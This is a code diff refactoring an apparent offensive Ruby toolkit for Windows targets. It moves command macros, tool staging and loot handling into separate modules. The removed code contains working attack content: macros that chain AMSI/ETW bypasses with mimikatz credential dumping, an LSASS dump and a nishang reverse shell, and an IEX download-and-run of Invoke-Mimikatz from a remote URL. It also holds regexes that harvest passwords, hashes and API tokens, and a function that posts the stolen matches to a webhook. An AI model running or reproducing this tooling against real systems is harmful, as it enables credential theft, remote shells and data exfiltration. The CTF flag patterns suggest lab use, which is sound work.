@@ -14,6 +14,13 @@ require 'digest/sha1'
 require 'readline'
 require 'shellwords'
 require 'evil_ctf/uploader'
+require_relative 'tools/downloader'
+require_relative 'tools/stager'
+require_relative 'tools/macro_engine'
+require_relative 'tools/alias_engine'
+require_relative 'tools/catalog_renderer'
+require_relative 'tools/loot_scanner'
+require_relative 'tools/loot_store'
 
 module EvilCTF::Tools
   TOOL_REGISTRY = {
@@ -492,657 +499,76 @@ end
   
   
   class CommandManager
+    include MacroEngine
+    include AliasEngine
+
     def initialize
-      @aliases = {
-        'ls' => 'Get-ChildItem',
-        'dir' => 'Get-ChildItem',
-        'whoami' => '$env:USERNAME',
-        'pwd' => 'Get-Location',
-        'cd' => 'Set-Location',
-        'ps' => 'Get-Process',
-        'processes' => 'Get-Process',
-        'sysinfo' => 'systeminfo',
-        'services' => 'Get-Service',
-        'rm' => 'Remove-Item',
-        'cat' => 'Get-Content',
-        'mkdir' => 'New-Item -ItemType Directory',
-        'cp' => 'Copy-Item',
-        'mv' => 'Move-Item'
-      }
-      @macros = {
-        'kerberoast' => [BYPASS_4MSI_PS, '& "C:\\Users\\Public\\Rubeus.exe" kerberoast /outfile:C:\\Users\\Public\\hashes.txt 2>$null'],
-        'dump_creds' => [BYPASS_4MSI_PS, ETW_BYPASS_PS, '& "C:\\Users\\Public\\mimikatz.exe" "privilege::debug" "sekurlsa::logonpasswords" exit 2>$null'],
-        'lsass_dump' => [BYPASS_4MSI_PS, ETW_BYPASS_PS, '& "C:\\Users\\Public\\procdump64.exe" -accepteula -ma lsass.exe "C:\\Users\\Public\\lsass.dmp"'],
-        'invoke-mimikatz' => [
-          BYPASS_4MSI_PS,
-          ETW_BYPASS_PS,
-          'IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1")',
-          'Invoke-Mimikatz -DumpCreds'
-        ],
-        'sharphound_all' => [BYPASS_4MSI_PS, ETW_BYPASS_PS, '& "C:\\Users\\Public\\SharpHound.exe" -c all 2>$null'],
-        'seatbelt_all' => [BYPASS_4MSI_PS, ETW_BYPASS_PS, '& "C:\\Users\\Public\\Seatbelt.exe" -group=all 2>$null'],
-        'rubeus_klist' => [BYPASS_4MSI_PS, '& "C:\\Users\\Public\\Rubeus.exe" klist 2>$null'],
-        'bypass-etw' => [ETW_BYPASS_PS],
-        'bypass-4msi' => [BYPASS_4MSI_PS],
-        'inveigh_start' => [BYPASS_4MSI_PS, ETW_BYPASS_PS, INVEIGH_START_PS],
-        'socks_init' => [BYPASS_4MSI_PS, ETW_BYPASS_PS, 'Import-Module "C:\\Users\\Public\\socks.ps1"; Invoke-SocksProxy -BindPort 1080'],
-        'cred_harvest' => [BYPASS_4MSI_PS, ETW_BYPASS_PS, '& "C:\\Users\\Public\\mimikatz.exe" "privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam" exit 2>$null'],
-          'nishang_rev' => [BYPASS_4MSI_PS, ETW_BYPASS_PS, NISHANG_REV_PS],
-          'powerview_all' => [BYPASS_4MSI_PS, POWERVIEW_ALL_PS],
-          'dom_enum' => [BYPASS_4MSI_PS, DOM_ENUM_PS]
-      }
-    end
-    def expand_alias(cmd)
-      stripped = cmd.to_s.lstrip
-      return cmd if stripped.empty?
-
-      token, remainder = stripped.split(/\s+/, 2)
-      alias_expansion = @aliases[token]
-      return cmd unless alias_expansion
-
-      expanded = remainder && !remainder.empty? ? "#{alias_expansion} #{remainder}" : alias_expansion
-
-      leading_ws_len = cmd.length - stripped.length
-      return (' ' * leading_ws_len) + expanded
-    end
-    def expand_macro(name, shell, webhook: nil)
-      macro_name = name.downcase
-      macro = @macros[macro_name]
-      return false unless macro
-
-      puts "[*] Expanding macro: #{name}"
-      replacements = prepare_macro(macro_name, shell)
-      return true if replacements == false
-
-      replacements ||= {}
-      macro.each do |step|
-        begin
-          resolved_step = resolve_macro_step(step, replacements)
-          exec_res = EvilCTF::Execution.run(shell, resolved_step, timeout: 120)
-          puts exec_res.output.to_s.strip
-          matches = EvilCTF::Tools.grep_output(exec_res.output)
-          if matches.any?
-            EvilCTF::Tools.save_loot(matches)
-            EvilCTF::Tools.beacon_loot(webhook, matches) if webhook
-          end
-        rescue => e
-          puts "[!] Macro step failed: #{e.message}"
-          return false
-        end
-      end
-      true
+      @aliases = build_aliases
+      @macros = build_macros
     end
 
-    def prepare_macro(name, shell)
-      case name
-      when 'nishang_rev'
-        remote_path = locate_nishang_rev_remote(shell)
-        return { 'NishangRevRemote' => remote_path } if remote_path
-
-        cleanup_partial_nishang_stage(shell)
-        return false unless EvilCTF::Tools.safe_autostage('nishang', shell, {}, nil)
-
-        remote_path = locate_nishang_rev_remote(shell)
-        return { 'NishangRevRemote' => remote_path } if remote_path
-
-        puts "[!] Nishang staging completed, but Invoke-PowerShellTcp.ps1 was not found on target"
-        return false
-      when 'inveigh_start'
-        remote_path = locate_inveigh_remote(shell)
-        return { 'InveighRemote' => remote_path } if remote_path
-
-        return false unless EvilCTF::Tools.safe_autostage('inveigh', shell, {}, nil)
-
-        remote_path = locate_inveigh_remote(shell)
-        return { 'InveighRemote' => remote_path } if remote_path
-
-        puts "[!] Inveigh staging completed, but Inveigh.ps1 was not found on target"
-        return false
-      end
-
-      {}
-    rescue => e
-      puts "[!] Macro preparation failed: #{e.message}"
-      false
+    def list_macros
+      @macros.keys.sort
     end
-
-    def cleanup_partial_nishang_stage(shell)
-      remote_root = EvilCTF::Utils.escape_ps_string(TOOL_REGISTRY['nishang'][:recommended_remote])
-      cleanup_cmd = <<~PS
-        if (Test-Path '#{remote_root}') {
-          Remove-Item '#{remote_root}' -Recurse -Force -ErrorAction SilentlyContinue
-        }
-      PS
-      EvilCTF::Execution.run(shell, cleanup_cmd, timeout: 30)
-    rescue => e
-      puts "[!] Nishang cleanup warning: #{e.message}"
-    end
-
-    def locate_nishang_rev_remote(shell)
-      search_root = TOOL_REGISTRY['nishang'][:recommended_remote].rpartition('\\').first
-      search_root = EvilCTF::Utils.escape_ps_string(search_root)
-      locate_cmd = <<~PS
-        $match = Get-ChildItem -Path '#{search_root}' -Filter 'Invoke-PowerShellTcp.ps1' -Recurse -ErrorAction SilentlyContinue |
-          Select-Object -First 1 -ExpandProperty FullName
-        if ($match) { "FOUND::$match" } else { 'MISSING' }
-      PS
-
-      locate_res = EvilCTF::Execution.run(shell, locate_cmd, timeout: 30)
-      found_line = locate_res.output.to_s.lines.find { |line| line.start_with?('FOUND::') }
-      found_line&.sub('FOUND::', '')&.strip
-    end
-
-    def locate_inveigh_remote(shell)
-      remote = EvilCTF::Utils.escape_ps_string(INVEIGH_REMOTE)
-      check_cmd = "if (Test-Path '#{remote}') { 'FOUND::#{remote}' } else { 'MISSING' }"
-      check_res = EvilCTF::Execution.run(shell, check_cmd, timeout: 20)
-      found_line = check_res.output.to_s.lines.find { |line| line.start_with?('FOUND::') }
-      found_line&.sub('FOUND::', '')&.strip
-    end
-
-    def resolve_macro_step(step, replacements)
-      step.to_s.gsub(/\[(AttackerIP|AttackerPort|NishangRevRemote|InveighRemote)\]/) do
-        key = Regexp.last_match(1)
-        replacements[key] ||= prompt_macro_value(key, default: macro_placeholder_default(key))
-      end
-    end
-
-    def prompt_macro_value(key, default: nil)
-      label = key.gsub(/([a-z])([A-Z])/, '\\1 \\2')
-      prompt = default ? "#{label} [#{default}]: " : "#{label}: "
-      value = Readline.readline(prompt, true).to_s.strip
-      value = default if value.empty? && default
-      raise ArgumentError, "#{label} is required" if value.nil? || value.empty?
-
-      value
-    end
-
-    def macro_placeholder_default(key)
-      case key
-      when 'AttackerPort'
-        '4444'
-      end
-    end
-    def list_macros; @macros.keys.sort end
-    def list_aliases; @aliases.keys.sort end
   end
   # Helper functions for tool handling
   def self.download_tool(key, remote_download: false, shell: nil)
-    tool = TOOL_REGISTRY[key]
-    return nil unless tool && (tool[:download_url] || tool[:backup_urls])
-    FileUtils.mkdir_p('tools')
-    path = File.join('tools', tool[:filename])
-    if File.exist?(path)
-      puts "[+] #{tool[:name]} already downloaded at #{path}"
-      return path
-    end
-    if remote_download && shell
-      # Remote download on target
-      begin
-        puts "[*] Attempting remote download on target for #{key}..."
-        ps_cmd = <<~PS
-          try {
-            (New-Object System.Net.WebClient).DownloadFile('#{EvilCTF::Utils.escape_ps_string(tool[:download_url])}', '#{EvilCTF::Utils.escape_ps_string(tool[:recommended_remote])}')
-            "SUCCESS"
-          } catch {
-            "ERROR: $($_.Exception.Message)"
-          }
-        PS
-        result = shell.run(ps_cmd)
-        if result.output.include?('SUCCESS')
-          puts "[+] Remote download success for #{key}"
-          return tool[:recommended_remote]  # Return remote path for staging
-        else
-          puts "[!] Remote download failed: #{result.output}"
-        end
-      rescue => e
-        puts "[!] Remote download error: #{e.message}"
-      end
-    end
-    all_urls = [tool[:download_url]] + (tool[:backup_urls] || [])
-    all_urls.compact!
-    success = false
-    all_urls.each do |url|
-      next unless url
-      puts "[*] Attempting local download from #{url}..."
-      success = download_from_url(url, path)
-      if success
-        puts "[+] Success from #{url}"
-        break
-      else
-        puts "[!] Failed from #{url}"
-      end
-    end
-    if success
-      path
-    else
-      puts "[!] All attempts failed for #{key}. Check network or URLs."
-      nil
-    end
-  rescue => e
-    puts "[!] Error downloading #{key}: #{e.message}"
-    nil
+    Downloader.download_tool(
+      key,
+      registry: TOOL_REGISTRY,
+      remote_download: remote_download,
+      shell: shell
+    )
   end
   def self.download_from_url(url, path)
-    success = false
-    # Try curl
-    puts "[*] Trying curl..."
-    curl_cmd = "curl -L --fail -o #{Shellwords.escape(path)} #{Shellwords.escape(url)}"
-    success = system("#{curl_cmd} > /dev/null 2>&1")
-    return success if success
-    # Try wget
-    puts "[*] Trying wget..."
-    wget_cmd = "wget -O #{Shellwords.escape(path)} #{Shellwords.escape(url)}"
-    success = system("#{wget_cmd} > /dev/null 2>&1")
-    return success if success
-    # Try Ruby URI.open
-    puts "[*] Trying Ruby URI.open..."
-    begin
-      URI.open(url) do |f|
-        File.binwrite(path, f.read)
-      end
-      success = true
-    rescue => e
-      puts "[!] Ruby URI failed: #{e.message}"
-    end
-    return success if success
-    # Try PowerShell as last resort
-    puts "[*] Trying PowerShell Invoke-WebRequest..."
-    ps_cmd = "powershell -Command \"try { Invoke-WebRequest -Uri '#{EvilCTF::Utils.escape_ps_string(url)}' -OutFile '#{EvilCTF::Utils.escape_ps_string(path)}' -UseBasicParsing } catch { exit 1 }\""
-    success = system(ps_cmd)
-    success
+    Downloader.download_from_url(url, path)
   end
   def self.download_missing_tools(remote_download: false, shell: nil)
-    failures = []
-    TOOL_REGISTRY.each do |key, tool|
-      puts "\n[*] Checking #{tool[:name]} (#{key})..."
-      
-      # For zipped tools, we need special handling
-      if tool[:zip]
-        local_path = File.join('tools', tool[:filename])
-        
-        # Check if zip file exists locally
-        unless File.exist?(local_path)
-          puts "[*] Downloading ZIP for #{tool[:name]}..."
-          unless download_tool(key, remote_download: remote_download, shell: shell)
-            failures << key
-            next
-          end
-        end
-        
-        # If we have the zip and are doing local staging, extract it locally first
-        if !remote_download && File.exist?(local_path) && tool[:zip_pick]
-          puts "[*] Extracting ZIP locally for #{tool[:name]}..."
-          begin
-            Zip::File.open(local_path) do |zip_file|
-              # Extract the specific file we need
-              zip_file.extract(tool[:zip_pick], local_path.gsub('.zip', '')) if zip_file.find_entry(tool[:zip_pick])
-            end
-          rescue => e
-            puts "[!] ZIP extraction failed locally: #{e.message}"
-          end
-        end
-      else
-        # Original behavior for non-zip tools
-        unless download_tool(key, remote_download: remote_download, shell: shell)
-          failures << key
-        end
-      end
-    end
-    if failures.any?
-      puts "\n[!] Failed to download: #{failures.join(', ')}"
-      puts "[*] Suggestion: Manually download from #{TOOL_REGISTRY[failures.first][:url]} or check connectivity."
-    else
-      puts "[+] All tools downloaded successfully."
-    end
+    Downloader.download_missing_tools(
+      registry: TOOL_REGISTRY,
+      remote_download: remote_download,
+      shell: shell
+    )
   end
   # Auto staging logic (simplified from original)
   def self.safe_autostage(tool_key, shell, options, logger)
-    tool = TOOL_REGISTRY[tool_key]
-    return false unless tool
-    
-    # Check if we need to extract from ZIP
-    needs_extraction = tool[:zip] && (tool[:zip_pick] || tool[:zip_pick_x64] || tool[:zip_pick_x86])
-    
-    remote_path = tool[:recommended_remote]
-    
-    # If it's a zip file, check for the extracted version instead
-    if needs_extraction
-      # For zipped tools, determine which file we're looking for after extraction
-      extracted_file = nil
-      
-      if tool[:zip_pick_x64] && get_system_architecture(shell) == 'x64'
-        extracted_file = tool[:zip_pick_x64].split('/').last
-      elsif tool[:zip_pick_x86] && get_system_architecture(shell) == 'x86'
-        extracted_file = tool[:zip_pick_x86].split('/').last
-      elsif tool[:zip_pick]
-        extracted_file = tool[:zip_pick].split('/').last
-      end
-      
-      if extracted_file && !File.extname(extracted_file).empty?
-        located_path = self.locate_extracted_remote_path(shell, tool[:recommended_remote], extracted_file)
-        if located_path
-          puts "[+] #{tool[:name]} already staged at #{located_path}"
-          return true
-        end
-      end
-    end
-    
-    # ... existing code ...
-    
-    arch = get_system_architecture(shell)
-    puts "[*] System architecture: #{arch}"
-    adjusted_tool = tool.dup
-    # architecture-specific adjustments
-    if tool_key == 'procdump'
-      if arch == 'x64'
-        adjusted_tool[:filename] = 'procdump64.exe'
-        adjusted_tool[:recommended_remote] = 'C:\\Users\\Public\\procdump64.exe'
-      else
-        adjusted_tool[:filename] = 'procdump.exe'
-        adjusted_tool[:recommended_remote] = 'C:\\Users\\Public\\procdump.exe'
-      end
-    elsif tool_key == 'mimikatz' && tool[:zip]
-      adjusted_tool[:zip_pick] = (arch == 'x64') ? tool[:zip_pick_x64] : tool[:zip_pick_x86]
-    end
-    
-    local_path = find_tool_on_disk(tool_key)
-    unless local_path && File.exist?(local_path)
-      puts "[!] Local #{adjusted_tool[:filename]} not found. Attempting download..."
-      local_path = download_tool(tool_key)
-      return false unless local_path && File.exist?(local_path)
-    end
-    
-    # For zipped tools, we need to extract on target
-    if needs_extraction
-      # Stage the zip file first
-      zip_remote_path = tool[:recommended_remote]
-      
-      # If it's a specific architecture-based zip pick, adjust remote path accordingly
-      if adjusted_tool[:zip_pick] && !tool[:zip_pick_x64] && !tool[:zip_pick_x86]
-        # For archive roots like nishang, upload the archive alongside the extracted directory.
-        zip_remote_path = File.extname(tool[:recommended_remote]).empty? ? "#{tool[:recommended_remote]}.zip" : tool[:recommended_remote]
-      elsif tool[:zip_pick_x64] || tool[:zip_pick_x86]
-        # For architecture-specific zips, we still stage to the main path but extract appropriately
-        zip_remote_path = tool[:recommended_remote]
-      end
-      
-      puts "[*] Staging ZIP file #{adjusted_tool[:filename]} to #{zip_remote_path}"
-      
-      # Upload the zip file
-      success = EvilCTF::Uploader.upload_file(local_path: local_path, remote_path: zip_remote_path, shell: shell)
-      return false unless success
-      
-      # Create PowerShell extraction script
-      extract_root = tool[:recommended_remote].to_s.rpartition('\\').first
-      extract_ps = <<~PS
-        try {
-          $zipPath = '#{EvilCTF::Utils.escape_ps_string(zip_remote_path)}'
-          $extractPath = '#{EvilCTF::Utils.escape_ps_string(extract_root)}'
-          
-          Add-Type -AssemblyName System.IO.Compression.FileSystem
-          [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $extractPath)
-          
-          # Remove the zip file after extraction
-          Remove-Item $zipPath -Force
-          
-          "EXTRACTED"
-        } catch {
-          "ERROR: $($_.Exception.Message)"
-        }
-      PS
-      
-      result = shell.run(extract_ps)
-      if result.output.include?('EXTRACTED')
-        puts "[+] ZIP extracted successfully on target"
-        return true
-      else
-        extracted_file = adjusted_tool[:zip_pick]&.split('/')&.last
-        located_path = if extracted_file && !File.extname(extracted_file).empty?
-                         self.locate_extracted_remote_path(shell, tool[:recommended_remote], extracted_file)
-                       end
-        if located_path
-          puts "[+] ZIP content already present at #{located_path}"
-          return true
-        end
-
-        puts "[!] ZIP extraction failed: #{result.output}"
-        return false
-      end
-    else
-      # Original behavior for non-zip tools
-      puts "[*] Staging #{adjusted_tool[:name]} to #{remote_path}"
-      EvilCTF::Uploader.upload_file(local_path: local_path, remote_path: remote_path, shell: shell)
-    end
-  rescue => e
-    puts "[!] Staging failed for #{tool_key}: #{e.message}"
-    false
+    Stager.safe_autostage(
+      tool_key,
+      shell,
+      options,
+      logger,
+      registry: TOOL_REGISTRY,
+      download_tool_proc: method(:download_tool)
+    )
   end
   def self.execute_staged_tool(key, args = '', shell)
-    tool = TOOL_REGISTRY[key]
-    return false unless tool
-    remote_path = tool[:recommended_remote]
-    begin
-      puts "[*] Executing #{key} with args: #{args}"
-      ps_cmd = <<~PS
-        try {
-          $proc = Start-Process -FilePath '#{EvilCTF::Utils.escape_ps_string(remote_path)}' -ArgumentList '#{EvilCTF::Utils.escape_ps_string(args)}' -PassThru -WindowStyle Hidden
-          $proc.WaitForExit(60000) | Out-Null
-          if ($proc.HasExited) {
-            "Completed with exit code: $($proc.ExitCode)"
-          } else {
-            "Timed out after 60 seconds"
-            $proc.Kill()
-          }
-        } catch {
-          "Error: $_.Exception.Message"
-        }
-      PS
-      result = shell.run(ps_cmd)
-      puts result.output
-      true
-    rescue => e
-      puts "[!] Execution failed for #{key}: #{e.message}"
-      false
-    end
+    Stager.execute_staged_tool(key, args, shell, registry: TOOL_REGISTRY)
   end
 
   def self.locate_extracted_remote_path(shell, recommended_remote, extracted_file)
-    return nil if extracted_file.nil? || extracted_file.empty?
-
-    search_root = recommended_remote.to_s.rpartition('\\').first
-    search_root = EvilCTF::Utils.escape_ps_string(search_root)
-    target_name = EvilCTF::Utils.escape_ps_string(extracted_file)
-    locate_cmd = <<~PS
-      $match = Get-ChildItem -Path '#{search_root}' -Filter '#{target_name}' -Recurse -ErrorAction SilentlyContinue |
-        Select-Object -First 1 -ExpandProperty FullName
-      if ($match) { "FOUND::$match" } else { 'MISSING' }
-    PS
-
-    result = shell.run(locate_cmd)
-    found_line = result.output.to_s.lines.find { |line| line.start_with?('FOUND::') }
-    found_line&.sub('FOUND::', '')&.strip
-  rescue => e
-    puts "[!] Remote extracted-path lookup failed: #{e.message}"
-    nil
+    Stager.locate_extracted_remote_path(shell, recommended_remote, extracted_file)
   end
   def self.list_available_tools
-    puts "\n AVAILABLE TOOLS ".ljust(70, '=')
-    TOOL_REGISTRY.group_by { |_, v| v[:category] }.each do |cat, tools|
-      puts "\n #{cat.upcase}:"
-      tools.each do |key, t|
-        local_status = File.exist?(File.join('tools', t[:filename])) ? '📁' : '❌'
-        puts " [#{local_status}] #{t[:name]} (#{key}) - #{t[:description]}"
-      end
-    end
-    puts "\nCommands:"
-    puts " tools - List available tools"
-    puts " download_missing - Download all missing tools into ./tools"
-    puts " tool <name> - Stage and use a specific tool"
-    puts " tool all - Stage all available tools"
-    puts '=' * 70
+    CatalogRenderer.list_available_tools(registry: TOOL_REGISTRY)
   end
   # Helper functions for loot handling
   def self.grep_output(output)
-    # Fixed grep_output to handle nil properly
-    return [] if output.nil? || output.empty?
-   
-    # Add execution policy bypass check before attempting regex matching
-    if output.include?('execution policy') || output.include?('SecurityError')
-      puts "[!] PowerShell execution policy issue detected"
-      return []
-    end
-   
-    matches = []
-    error_indicators = [
-      'ObjectNotFound', 
-      'CommandNotFoundException',
-      'FileNotFoundException',
-      'ResourceUnavailable',
-      'Modules_ModuleNotFound',
-      'CategoryInfo',
-      'FullyQualifiedErrorId',
-      'is not recognized'
-    ]
-    error_count = error_indicators.count { |error| output.include?(error) }
-    total_lines = output.lines.count
-    error_ratio = error_count.to_f / total_lines
-    if error_ratio > 0.3
-      puts "[*] Skipping loot scan - output appears to be mostly errors"
-      return matches
-    end
-    patterns = [
-      /flag\{[^\}]+\}/i,
-      /htb\{[^\}]+\}/i,
-      /picoctf\{[^\}]+\}/i,
-      /ctf\{[^\}]+\}/i,
-      /password\s*[:=]\s*["']?([^"'\s]+)["']?/i,
-      /Password\s*[:=]\s*["']?([^"'\s]+)["']?/i,
-      /pwd\s*[:=]\s*["']?([^"'\s]+)["']?/i,
-      /token\s*[:=]\s*["']?([^"'\s]+)["']?/i,
-      /Token\s*[:=]\s*["']?([^"'\s]+)["']?/i,
-      /[A-Fa-f0-9]{32}/,
-      /[A-Fa-f0-9]{40}/,
-      /[A-Fa-f0-9]{64}/,
-      /[A-Fa-f0-9]{128}/,
-      /[A-Za-z0-9+\/]{20,}={0,2}/,
-      /(?:[A-Za-z0-9+\/]{4})*(?:[A-Za-z0-9+\/]{2}==|[A-Za-z0-9+\/]{3}=)?/,
-      /-----BEGIN [A-Z ]+-----/,
-      /-----END [A-Z ]+-----/,
-      /jwt\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*/i,
-      /eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*/i,
-      /(\w+@\w+\.\w+):([^@\s]+)/,
-      /Username\s*:\s*(\S+)\s+Password\s*:\s*(\S+)/i,
-      /User\s*:\s*(\S+)\s+Pass\s*:\s*(\S+)/i,
-      /NTLM\s*:\s*([A-F0-9]{32})/i,
-      /LM\s*:\s*([A-F0-9]{32})/i,
-      /Hash\s*:\s*([A-F0-9]{32})/i,
-      # Added more patterns
-      /AKIA[0-9A-Z]{16}/,  # AWS Access Key
-      /aws_secret_access_key\s*=\s*["']?([^"'\s]+)["']?/i,
-      /ssh-rsa AAAA[0-9A-Za-z+\/]+[=]{0,3}/,  # SSH public key
-      /-----BEGIN PRIVATE KEY-----/,  # Private keys
-      /sk-[a-zA-Z0-9]{48}/,  # OpenAI API key
-      /ghp_[0-9A-Za-z]{36}/,  # GitHub Personal Access Token
-      /AIza[0-9A-Za-z\-_]{35}/,  # Google API key
-      /ya29\.[0-9A-Za-z\-_]+/,  # Google OAuth
-      /xoxp-[0-9A-Za-z\-]+/,  # Slack token
-      /Bearer [A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+/,  # JWT Bearer
-      /azure_client_secret\s*=\s*["']?([^"'\s]+)["']?/i,  # Azure secret
-      /DB_PASSWORD\s*=\s*["']?([^"'\s]+)["']?/i,  # DB passwords
-      /PRIVATE-TOKEN:\s*[0-9a-zA-Z\-_]{20,}/,  # GitLab token
-      /npm_token\s*=\s*[0-9a-f-]{36}/i  # NPM token
-    ]
-    output.each_line do |line|
-      next if line.include?('CategoryInfo') || line.include?('FullyQualifiedErrorId') || line.include?('is not recognized')
-      patterns.each do |regex|
-        line.scan(regex).each do |match|
-          if match.is_a?(Array)
-            cleaned_match = match.compact.join(':')
-            matches << cleaned_match unless cleaned_match.empty?
-          else
-            matches << match.strip
-          end
-        end
-      end
-    end
-    matches.uniq
+    LootScanner.grep_output(output)
   end
-  def self.save_loot(matches)
-    # Fixed save_loot to handle empty matches properly
-    return if matches.nil? || matches.empty?
-    FileUtils.mkdir_p('loot')
-    begin
-      File.open('loot/loot.txt', 'a') do |f|
-        matches.each do |m|
-          f.puts(m) unless m.is_a?(String) && m.start_with?('{')
-        end
-      end
-      json_loot = if File.exist?('loot/creds.json')
-                    JSON.parse(File.read('loot/creds.json'))
-                  else
-                    []
-                  end
-      json_loot += matches.select { |m| m.is_a?(String) && m.start_with?('{') }
-      json_loot = json_loot.uniq
-      File.write('loot/creds.json', JSON.pretty_generate(json_loot))
-    rescue Errno::ENOSPC => e
-      puts "[!] No space left on device for loot saving: #{e.message}"
-    rescue => e
-      puts "[!] Save loot failed: #{e.message}"
-    end
+
+  def self.save_loot(matches, event_logfile: nil)
+    LootStore.save_loot(matches, event_logfile: event_logfile)
   end
+
   def self.beacon_loot(webhook, matches)
-    # Fixed beacon_loot to handle empty matches properly
-    return if matches.nil? || matches.empty? || webhook.nil?
-    uri = URI(webhook)
-    req = Net::HTTP::Post.new(uri)
-    req['Content-Type'] = 'application/json'
-    req.body = { loot: matches }.to_json
-    Net::HTTP.start(uri.hostname, uri.port, use_ssl: uri.scheme == 'https') do |http|
-      http.request(req)
-    end
-  rescue => e
-    puts "[!] Beacon failed: #{e.message}"
+    LootStore.beacon_loot(webhook, matches)
   end
  
   def self.find_tool_on_disk(tool_key)
-    tool = TOOL_REGISTRY[tool_key]
-    return nil unless tool
-
-    search_patterns = tool[:search_patterns] || [tool[:filename]]
-    base_dirs = [
-      ENV['HOME'],
-      File.join(ENV['HOME'], 'Downloads'),
-      File.join(ENV['HOME'], 'Desktop'),
-      File.join(ENV['HOME'], 'tools'),
-      File.join(ENV['HOME'], 'bin'),
-      Dir.pwd,
-      File.join(Dir.pwd, 'tools')
-    ].compact.uniq
-
-    search_patterns.each do |pattern|
-      base_dirs.each do |base|
-        next unless Dir.exist?(base)
-        # Use find with max depth 3
-        Dir.glob(File.join(base, '**', pattern), File::FNM_CASEFOLD).each do |path|
-          return path if File.file?(path)
-        end
-      end
-    end
-    nil
+    Stager.find_tool_on_disk(tool_key, registry: TOOL_REGISTRY)
   end
   def self.get_system_architecture(shell)
-    result = shell.run('$env:PROCESSOR_ARCHITECTURE')
-    arch = result.output.strip
-   
-    if arch.include?('64')
-      'x64'
-    elsif arch.include?('86')
-      'x86'
-    else
-      'unknown'
-    end
+    Stager.get_system_architecture(shell)
   end
   
 
